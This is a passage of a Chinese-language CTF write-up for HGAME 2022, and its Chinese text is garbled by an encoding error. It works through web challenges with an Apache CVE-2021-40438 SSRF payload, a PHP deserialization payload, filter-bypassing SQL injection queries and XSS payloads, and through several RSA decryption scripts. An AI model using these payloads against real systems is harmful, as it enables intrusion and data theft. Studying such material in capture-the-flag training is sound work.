alt="image-20220122003437238"></p><p>è¿™ä¸ªflagåœ¨å•å¼•å·é‡Œè¾¹çš„éƒ¨åˆ†è¿˜æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œå¯èƒ½æ˜¯å› ä¸ºkeyçš„å…³ç³»ï¼Œä½†æ˜¯ç”±attfckèƒ½çŒœå‡ºattackï¼Œç”±pla1qtextèƒ½çŒœå‡ºplaintextï¼Œç„¶åæ”¹å®Œä¹‹åæœä¸€ä¸‹<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220122003614141.png" alt="image-20220122003614141"></p><p>æœ€ç»ˆflag</p><p>hgame{D0_y0u_kn0w_&#39;Kn0wn-pla1ntext_attack&#39;?}</p><h1 id="ç¬¬äºŒå‘¨wp"><a href="#ç¬¬äºŒå‘¨wp" class="headerlink" title="ç¬¬äºŒå‘¨wp"></a>ç¬¬äºŒå‘¨wp</h1><h2 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache!*"></a>Apache!*</h3><p>æœ‰å¤‡ä»½æ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220205114347850.png" alt="image-20220205114347850"></p><p>æ ¹æ®é¢˜ç›®æè¿°åº”è¯¥æ˜¯ssrfæ¼æ´ï¼Œç»“åˆapacheç‰ˆæœ¬èƒ½æœåˆ°CVE-2021-40438</p><pre class="language-none"><code class="language-none">?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http:&#x2F;&#x2F;internal.host&#x2F;</code></pre><p>ä½†æ˜¯ç½‘ä¸Šçš„ exp å¤§å¤šæ˜¯ Apache ç›´æ¥ä½œä¸ºä»£ç†æœåŠ¡å™¨çš„æƒ…å†µï¼Œè¿™é¢˜ç»™äº† Apache çš„é…ç½®æ–‡ä»¶ https-vhosts.conf , &#39;/&#39; æä¾›é™æ€èµ„æºæœåŠ¡ï¼Œ &#39;/proxy&#39; æä¾›ä»£ç†æœåŠ¡ã€‚</p><p>æ‰€ä»¥è¦åœ¨/proxyè·¯å¾„ä¸‹ç”¨payload</p><h3 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129140416825.png" alt="image-20220129140416825"></p><p>çœ‹æºç ï¼Œä¸¤æ¬¡base64è§£ç å¾—åˆ°flag</p><pre class="language-none"><code class="language-none">hgame&#123;D0nt_f0r9et_2_ClOs3_S0urce_m@p&#125;</code></pre><h3 id="ä¸€æœ¬å•è¯ä¹¦"><a href="#ä¸€æœ¬å•è¯ä¹¦" class="headerlink" title="ä¸€æœ¬å•è¯ä¹¦"></a>ä¸€æœ¬å•è¯ä¹¦</h3><p>çœ‹æºç æœ‰<a href="http://www.zipçš„æç¤º/">www.zipçš„æç¤º</a></p><p>ä»£ç å®¡è®¡ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129140800363.png" alt="image-20220129140800363"></p><p>ç®€å•çš„ç”¨æˆ·åˆ¤æ–­</p><p>ç»•è¿‡ä¹‹å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129140849923.png" alt="image-20220129140849923"></p><p>çœ‹index.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129140911249.png" alt="image-20220129140911249"></p><p>å¤§è‡´é€»è¾‘å°±æ˜¯å°†è¾“å…¥çš„ä¼ å…¥get.phpå’Œsave.phpè¿›è¡Œå¤„ç†</p><p>save.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129141059537.png" alt="image-20220129141059537"></p><p>å°†ä¼ å…¥çš„å•è¯çš„keyå’Œvalueå†™å…¥æ–‡ä»¶ä¸­ï¼Œå¹¶åˆ©ç”¨|æ¥å°†keyå’Œvalueçš„åºåˆ—åŒ–ä¹‹åçš„å€¼åˆ†éš”ã€‚</p><p>get.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129141542508.png" alt="image-20220129141542508"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129141208348.png" alt="image-20220129141208348"></p><p>è¯»å–save.phpä¸­åˆ›å»ºçš„æ–‡ä»¶çš„å†…å®¹</p><p>evil.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129141359385.png" alt="image-20220129141359385"></p><p>çœ‹è§wakeupæ–¹æ³•ï¼Œå†è”ç³»get.phpæ—¶çš„unserializeå¯ä»¥çŒœæµ‹è¿™é‡Œæ˜¯è¦åˆ©ç”¨ååºåˆ—åŒ–è®©file=/flagç„¶åä»¤flagå˜é‡çš„å€¼å˜ä¸ºflagå†åˆ©ç”¨get.phpå°†å…¶è¯»å‡ºæ¥</p><p>è¿™é‡Œè¦æ³¨æ„åºåˆ—åŒ–çš„å†…å®¹è¦åœ¨å¡«åœ¨å•è¯çš„ä½ç½®ï¼Œå°†å…¶ä½œä¸ºæ•°ç»„çš„keyè€Œä¸æ˜¯valueï¼Œå¦åˆ™åœ¨encodeå‡½æ•°æ—¶ä¼šå¯¹valueå†è¿›è¡Œä¸€æ¬¡åºåˆ—åŒ–å¯¼è‡´payloadæ”¹å˜ï¼Œæ— æ³•æ‰§è¡Œååºåˆ—åŒ–æ“ä½œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129184316177.png" alt="image-20220129184316177"></p><p>è¿˜è¦åœ¨ååºåˆ—åŒ–çš„payloadå‰æ·»åŠ |ç¬¦å·</p><p>è®©|åçš„éƒ¨åˆ†æ‰§è¡Œdecodeå‡½æ•°ä¸­çš„ååºåˆ—åŒ–</p><p>å°†evilç±»ä¸­çš„fileèµ‹å€¼ä¸º/flagï¼Œä»è€Œè®©flag=/flagæ–‡ä»¶ä¸­çš„å†…å®¹</p><p>è¿™é‡Œçš„ifè¿‡æ»¤æ²¡å•¥ç”¨</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129185352257.png" alt="image-20220129185352257"></p><p>æœ€ç»ˆpayload</p><pre class="language-php" data-language="php"><code class="language-php">&#123;|O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;N;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129185511329.png" alt="image-20220129185511329"></p><h3 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223228959.png" alt="image-20220130223228959"></p><p>å¼€å§‹é¡µé¢ï¼Œæºç é‡Œæç¤ºäº†ä¸ªindex?id=1</p><p>è¾“åˆ°urlä¸Šèƒ½çœ‹å‡ºæ¥idçš„æ•°å†³å®šäº†å‡ºç°çš„æ˜¯å“ªä¸ªç²¾çµ</p><p>å½“idä¸æ˜¯1ï¼Œ2ï¼Œ3å…¶ä¸­çš„æ•°æ—¶ä¼šè·³è½¬åˆ°error.php</p><p>åˆšå¼€å§‹æ„Ÿè§‰æ˜¯sqlæ³¨å…¥ï¼Œæ³¨äº†åŠå¤©è¿™ä¸ªé¡µé¢æ²¡æŠ¥é”™ï¼Œè¿™é‡Œidçš„å€¼æ„Ÿè§‰æ˜¯é€šè¿‡phpçš„å¼±æ¯”è¾ƒæ¥åˆ¤æ–­çš„ï¼Œå¼€å§‹æ€€ç–‘æ˜¯ä¸æ˜¯åˆ«çš„æ¼æ´ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223531260.png" alt="image-20220130223531260"></p><p>æ‰«äº†ä¸€ä¸‹æ‰«åˆ°äº†db.phpæ‰ç¡®å®šå°±æ˜¯sqlæ³¨å…¥</p><p>äºæ˜¯å°è¯•åœ¨errorç•Œé¢æ³¨å…¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223651689.png" alt="image-20220130223651689"></p><p>å½“codeä¸ä¸ºæ•°å­—æ—¶ä¼šå‡ºç°æŠ¥é”™</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223713519.png" alt="image-20220130223713519"></p><p>åˆšå¼€å§‹æ²¡æœ‰ç»™æºç ï¼Œè¯•äº†å¥½å‡ æ¬¡æ²¡è¯•å‡ºæ¥æ€ä¹ˆæ³¨å…¥</p><p>ä¸»åŠæ–¹ç»™çš„æºç ï¼š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223751805.png" alt="image-20220130223751805"></p><p>æœ‰äº†æºç ä¹‹åå°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„è”åˆæ³¨å…¥äº†</p><p>æ‹¬å·æˆ–è€…/*x*/æ›¿ä»£ç©ºæ ¼ï¼Œç”¨likeæ›¿ä»£ç­‰äºï¼ŒåŒå†™ç»•è¿‡å…³é”®å­—ï¼Œå› ä¸ºæ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œæ‰€ä»¥ä¹Ÿä¸éœ€è¦æ³¨é‡Šç¬¦</p><p>çˆ†åº“å</p><pre class="language-none"><code class="language-none">?code&#x3D;1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,database()</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130221501997.png" alt="image-20220130221501997"></p><pre class="language-none"><code class="language-none">?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(table_name)frfromom(infoorrmation_schema.tables)whwhereere(table_schema)like&#39;pokemon&#39;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130221833846.png" alt="image-20220130221833846"></p><pre class="language-none"><code class="language-none">?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere(table_name)like&#39;fllllllllaaaaaag&#39;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130221937816.png" alt="image-20220130221937816"></p><pre class="language-none"><code class="language-none">?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,(flag)frfromom&#x2F;*x*&#x2F;fllllllllaaaaaa</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130222120527.png" alt="image-20220130222120527"></p><h3 id="At0mçš„ç•™è¨€æ¿"><a href="#At0mçš„ç•™è¨€æ¿" class="headerlink" title="At0mçš„ç•™è¨€æ¿*"></a>At0mçš„ç•™è¨€æ¿*</h3><p>xssæ¼æ´</p><p>è¯´èµ·è¿™ä¸ªæˆ‘å°±æƒ³èµ·æ¥bç«™é‚£æ¬¡çš„xssï¼Œè¿˜æœ‰æˆ‘è¿˜æ²¡å¼€å§‹çš„jså­¦ä¹ ï¼ˆ</p><p>å…ˆè¯•ä¸€ä¸‹</p><pre class="language-none"><code class="language-none">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220205121248714.png" alt="image-20220205121248714"></p><p>ç¡®å®šæ˜¯xss</p><p>ç„¶åä¸»åŠæ–¹ç»™äº†ä¸ªhint</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220211120719244.png" alt="image-20220211120719244"></p><p>è¾“å‡ºç”¨æˆ·ç•™è¨€ä½ç½®çš„classæ ‡ç­¾åä¸ºcontentï¼Œç„¶åè¿˜æœ‰ä¸€ä¸ªç”¨varå®šä¹‰çš„flagå…¨å±€å˜é‡</p><p>ä¸ºä»€ä¹ˆåŒæ ·æ˜¯ä¸¤ä¸ªå˜é‡ï¼Œç¬¬ä¸€ä¸ªä½¿ç”¨letï¼Œè€Œç¬¬äºŒä¸ªä½¿ç”¨varå‘¢ï¼Ÿå› ä¸ºä½¿ç”¨ var å¯ ä»¥åˆ©ç”¨ Object.keys(window) æ‹¿åˆ°å…¨å±€å˜é‡ flag çš„å˜é‡åï¼Œè€Œä½¿ç”¨letçš„è¯æ— æ³•è·å–ã€‚</p><p>ä¹Ÿå¯ä»¥ç›´æ¥ç”¨Object.values(window)è¯»å–è¿™äº›å…¨å±€å˜é‡çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥è·å¾—flag</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token string">"document.getElementsByClassName('content')[0].innerHTML= Object.values(window)"</span><span class="token operator">></span></code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220211121033670.png" alt="image-20220211121033670"></p><p>ç”±äºæç¤ºé‡Œè¿™ä¸ªflagå®šä¹‰åœ¨äº†ä¸€ä¸ªscriptæ ‡ç­¾é‡Œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨document.scriptsæ¥è¯»å‡ºscriptæ ‡ç­¾é‡Œçš„å†…å®¹</p><pre class="language-none"><code class="language-none">&lt;img src&#x3D;1 onerror&#x3D;&quot;document.getElementsByClassName(&#39;content&#39;) [0].innerText&#x3D;document.scripts[0].text;&quot;&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220211124302100.png" alt="image-20220211124302100"></p><h2 id="CRYPTO-1"><a href="#CRYPTO-1" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RSA-Attack"><a href="#RSA-Attack" class="headerlink" title="RSA Attack"></a>RSA Attack</h3><p>rsaçœŸæ˜¯å…¨å¥—è„šæœ¬å°±è¡Œ</p><p>åŠ å¯†è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python">from Crypto.Util.number import getPrimefrom libnum import s2nfrom secret import flagm &#x3D; s2n(flag)e &#x3D; 65537p &#x3D; getPrime(80)q &#x3D; getPrime(80)n &#x3D; p * qc &#x3D; pow(m, e, n)print(&quot;e &#x3D;&quot;, e)print(&quot;n &#x3D;&quot;, n)print(&quot;c &#x3D;&quot;, c)</code></pre><p>æ­£å¸¸çš„rsaåŠ å¯†ï¼Œç»™äº†eï¼Œnï¼Œcæ±‚m</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129190127418.png" alt="image-20220129190127418"></p><p>åœ¨çº¿ç½‘ç«™åˆ†è§£nå¾—åˆ°pq</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129190208787.png" alt="image-20220129190208787"></p><pre class="language-none"><code class="language-none">import gmpy2from libnum import n2sdef Decrypt(c, e, p, q):   L &#x3D; (p - 1) * (q - 1)   d &#x3D; gmpy2.invert(e, L)   n &#x3D; p * q   m &#x3D; gmpy2.powmod(c, d, n)   flag &#x3D; n2s(int(m)   print(flag)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:   p &#x3D;  715800347513314032483037   q &#x3D;  978782023871716954857211   e &#x3D; 65537   c &#x3D; 122622425510870177715177368049049966519567512708   Decrypt(c, e, p, q)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129190508606.png" alt="image-20220129190508606"></p><h3 id="RSA-Attack-2"><a href="#RSA-Attack-2" class="headerlink" title="RSA Attack 2"></a>RSA Attack 2</h3><p>åŠ å¯†è„šæœ¬</p><pre class="language-none"><code class="language-none">import refrom math import ceilfrom Crypto.Util.number import getPrimefrom libnum import s2n#flag_parts &#x3D; list(map(s2n, re.findall(rf&quot;.&#123;&#123;,&#123;ceil(len(flag) &#x2F; 3)&#125;&#125;&#125;&quot;, flag)))print(&quot;# task1&quot;)m &#x3D; 42949244670170607238949839659191560916635942982341043413490558510e &#x3D; 65537p &#x3D; 118106171709518613190337380120721639096109433871758551481750559628607841525199933396401045857313841962667087681000077908575349856203197989280137518119610447265022793158335778819939567162786340083036604758380394175830091289942677310940962706354018362632488404102976344446903748276214668285468119214940392725123q &#x3D; 123715343521970684000128799876071042830570723218116931151467220244765055889417626806554868114525566978436323975083498703832794561493291312079691396671274837322036085911028636844643698862533724625315331567014898932701977758733187411738771617885153639118174062773966499612201555575923412045644028857989016603411r &#x3D; 169239143092963922213343686924677363088963485633027091645501151388482565490233323796889691624272664985173525812002355530484741432847170511348177065704338978754457533424010842217007432554862861949141613925946472939183705336155629494107050470952474816647080432002189309272835581148740211208678012416960136441833n1 &#x3D; p * qc1 &#x3D; pow(m, e, n1)n2 &#x3D; r * qc2 &#x3D; pow(m, e, n2)print(&quot;e &#x3D;&quot;, e)print(&quot;n1 &#x3D;&quot;, n1)print(&quot;c1 &#x3D;&quot;, c1)print(&quot;n2 &#x3D;&quot;, n2)print(&quot;c2 &#x3D;&quot;, c2)print(&quot;# task2&quot;)m &#x3D; 26926584401348540331333678102939069838976561137078484378892509505e &#x3D; 7p &#x3D; getPrime(1024)q &#x3D; getPrime(1024)n &#x3D; 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537c &#x3D; pow(m, e, n)print(&quot;e &#x3D;&quot;, e)print(&quot;n &#x3D;&quot;, n)print(&quot;c &#x3D;&quot;, c)print(&quot;# task3&quot;)m &#x3D; flag_parts[2]p &#x3D; getPrime(1024)q &#x3D; getPrime(1024)n &#x3D; p * qe1 &#x3D; getPrime(32)e2 &#x3D; getPrime(32)c1 &#x3D; pow(m, e1, n)c2 &#x3D; pow(m, e2, n)print(&quot;n &#x3D;&quot;, n)print(&quot;e1 &#x3D;&quot;, e1)print(&quot;c1 &#x3D;&quot;, c1)print(&quot;e2 &#x3D;&quot;, e2)print(&quot;c2 &#x3D;&quot;, c2)</code></pre><p>å°†flagåˆ†äº†ä¸‰æ®µååˆ†åˆ«ç”¨äº†ä¸åŒçš„åŠ å¯†æ–¹å¼</p><p><strong>ç¬¬ä¸€æ®µ</strong></p><p>ä»£ç èƒ½çœ‹å‡ºn1å’Œn2æœ‰å…±åŒçš„ç´ å› å­ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨æ¬§å‡ é‡Œå¾—ç®—æ³•ç›´æ¥å°† n1 å’Œ n2 åˆ†è§£ã€‚é€šè¿‡æ¬§å‡ é‡Œå¾—ç®—æ³•å¯ä»¥ç›´æ¥æ±‚å‡º n1 å’Œ n2 çš„æœ€å¤§å…¬çº¦æ•° p:</p><p>outputç»™äº†e,n1,n2,c1,c2</p><pre class="language-none"><code class="language-none">def gcd(a, b):    if a &lt; b:        a, b &#x3D; b, a    while b !&#x3D; 0:        temp &#x3D; a % b        a &#x3D; b        b &#x3D; temp    return adef gcd_digui(a, b):    if b !&#x3D; 0:        return a    return gcd(b, a % b)n1 &#x3D; 14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553n2 &#x3D; 20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363p &#x3D; gcd(n1, n2)q &#x3D; n1&#x2F;&#x2F;pr &#x3D; n2&#x2F;&#x2F;pprint(p)print(q)print(r)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129191322862.png" alt="image-20220129191322862"></p><pre class="language-none"><code class="language-none">p&#x3D;123715343521970684000128799876071042830570723218116931151467220244765055889417626806554868114525566978436323975083498703832794561493291312079691396671274837322036085911028636844643698862533724625315331567014898932701977758733187411738771617885153639118174062773966499612201555575923412045644028857989016603411q&#x3D;118106171709518613190337380120721639096109433871758551481750559628607841525199933396401045857313841962667087681000077908575349856203197989280137518119610447265022793158335778819939567162786340083036604758380394175830091289942677310940962706354018362632488404102976344446903748276214668285468119214940392725123r&#x3D;16923914309296392221334368692467736308896348563302709164550115138848256549023332379688969162427266498517352581200235553048474143284717051134817706570433897875445753342401084221700743255486286194914161392594647293918370533615562949410705047095247481664708043200218930927283558114874021120867801241696013644183